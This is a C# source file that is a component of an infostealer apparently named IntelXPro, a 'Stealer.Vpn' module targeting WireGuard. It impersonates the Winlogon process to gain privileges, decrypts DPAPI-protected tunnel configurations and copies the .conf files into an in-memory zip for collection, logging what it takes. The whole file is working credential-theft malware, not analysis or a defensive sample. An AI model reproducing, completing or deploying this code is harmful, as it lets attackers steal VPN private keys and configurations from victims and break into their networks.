using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using IntelXPro.src.IntelXPro.Dependencies.General;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Vpn
{
    internal class WireGuard : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = "C:\\Program Files\\WireGuard\\Data\\Configurations";
            if (!Directory.Exists(text))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "WireGuard";
            try
            {
                using (ImpersonationHelper.ImpersonateWinlogon())
                {
                    Parallel.ForEach(Directory.GetFiles(text), delegate (string file)
                    {
                        try
                        {
                            string extension = Path.GetExtension(file);
                            if (extension == ".dpapi")
                            {
                                byte[] content = DpApi.Decrypt(File.ReadAllBytes(file));
                                zip.AddFile("WireGuard\\" + Path.GetFileNameWithoutExtension(file), content);
                            }
                            else if (extension == ".conf")
                            {
                                zip.AddFile("WireGuard\\" + Path.GetFileNameWithoutExtension(file) + ".conf", File.ReadAllBytes(file));
                            }
                        }
                        catch
                        {
                        }
                    });
                }
            }
            catch
            {
            }
            counterApplications.Files.Add(text + " => WireGuard");
            counterApplications.Files.Add("WireGuard\\");
            counter.Vpns.Add(counterApplications);
        }
    }

}
